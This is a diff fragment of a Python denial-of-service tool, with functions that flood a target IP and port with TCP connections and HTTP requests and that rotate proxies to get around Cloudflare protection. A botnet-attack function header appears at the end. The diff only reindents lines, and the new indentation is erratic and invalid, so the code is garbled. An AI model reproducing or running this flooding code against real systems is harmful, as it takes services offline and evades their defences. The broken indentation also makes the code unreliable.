@@ -96,13 +96,13 @@ def tcp_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  while duration > 0:
      try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect((target_ip, target_port))
- s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
- s.close()
- except Exception as e:
- print(f"TCP Flood Error: {e}")
- duration -= 1
- time.sleep(1 / requests_per_second)
+         s.connect((target_ip, target_port))
+          s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+           s.close()
+             except Exception as e:
+             print(f"TCP Flood Error: {e}")
+              duration -= 1
+              time.sleep(1 / requests_per_second)
 
 # Layer 7 (HTTP) Attack with Proxy and Cloudflare Bypass
 def http_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
@@ -114,17 +114,17 @@ def http_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  while duration > 0:
      try:
          response = requests.get(f"http://{target_ip}:{target_port}/", proxies=proxies, timeout=5)
- if 'cloudflare' in response.text.lower():
- print("Cloudflare detected, rotating proxy...")
+          if 'cloudflare' in response.text.lower():
+            print("Cloudflare detected, rotating proxy...")
  proxy = get_random_proxy()
  proxies = {
  "http": proxy,
  "https": proxy,
  }
  except Exception as e:
- print(f"HTTP Flood Error: {e}")
- duration -= 1
- time.sleep(1 / requests_per_second)
+                       print(f"HTTP Flood Error: {e}")
+                       duration -= 1
+                        time.sleep(1 / requests_per_second)
 
 # C2C (Client to Client) Bypass with Proxy and Cloudflare Bypass
 def c2c_bypass_with_proxy_and_cf_bypass(target_ip, target_port, duration):
@@ -136,13 +136,13 @@ def c2c_bypass_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  while duration > 0:
      try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect((target_ip, target_port))
- s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
- s.close()
+          s.connect((target_ip, target_port))
+           s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+            s.close()
  except Exception as e:
- print(f"C2C Bypass Error: {e}")
- duration -= 1
- time.sleep(1 / requests_per_second)
+                      print(f"C2C Bypass Error: {e}")
+                       duration -= 1
+                        time.sleep(1 / requests_per_second)
 
 # Botnet Simulation
 def botnet_attack_with_proxy_and_cf_bypass(target_ip, target_port, botnet_size, duration):
